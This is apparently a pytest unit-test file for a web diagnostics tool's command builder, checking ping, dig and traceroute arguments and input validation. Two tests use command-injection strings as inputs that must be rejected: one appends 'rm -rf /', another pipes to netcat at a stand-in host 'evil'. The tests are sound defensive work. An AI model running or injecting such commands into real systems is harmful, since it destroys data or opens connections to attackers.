"""Unit tests for the diag tool argument builder."""

from __future__ import annotations

import pytest

from web.diag import runner as diag_runner


def test_build_command_ping_basic():
    argv = diag_runner.build_command("ping", target="8.8.8.8", iface=None, count=3)
    assert argv[0] == "/bin/ping"
    assert "8.8.8.8" in argv
    assert "-c" in argv and "3" in argv


def test_build_command_ping_with_interface():
    argv = diag_runner.build_command("ping", target="example.com", iface="eth0", count=2)
    assert "-I" in argv
    assert argv[argv.index("-I") + 1] == "eth0"
    assert "example.com" in argv


def test_build_command_dig_basic():
    argv = diag_runner.build_command("dig", target="example.com", iface=None, count=1)
    assert argv[0] == "/usr/bin/dig"
    assert "example.com" in argv


def test_build_command_traceroute_basic():
    argv = diag_runner.build_command("traceroute", target="1.1.1.1", iface="lte0", count=1)
    assert argv[0] == "/usr/bin/traceroute"
    assert "lte0" in argv


def test_build_command_rejects_unknown_tool():
    with pytest.raises(ValueError):
        diag_runner.build_command("rm", target="8.8.8.8", iface=None, count=1)


def test_build_command_rejects_shell_metacharacters_in_target():
    with pytest.raises(ValueError):
        diag_runner.build_command("ping", target="8.8.8.8; rm -rf /", iface=None, count=1)


def test_build_command_rejects_pipe_in_target():
    with pytest.raises(ValueError):
        diag_runner.build_command("ping", target="example.com|nc evil 4444", iface=None, count=1)


def test_build_command_rejects_unknown_interface():
    with pytest.raises(ValueError):
        diag_runner.build_command("ping", target="8.8.8.8", iface="evil0", count=1)


def test_build_command_rejects_count_out_of_range():
    with pytest.raises(ValueError):
        diag_runner.build_command("ping", target="8.8.8.8", iface=None, count=999)
    with pytest.raises(ValueError):
        diag_runner.build_command("ping", target="8.8.8.8", iface=None, count=0)


def test_build_command_rejects_empty_target():
    with pytest.raises(ValueError):
        diag_runner.build_command("ping", target="", iface=None, count=1)


def test_build_command_accepts_ipv6_target():
    argv = diag_runner.build_command("ping", target="2001:db8::1", iface=None, count=1)
    assert "2001:db8::1" in argv
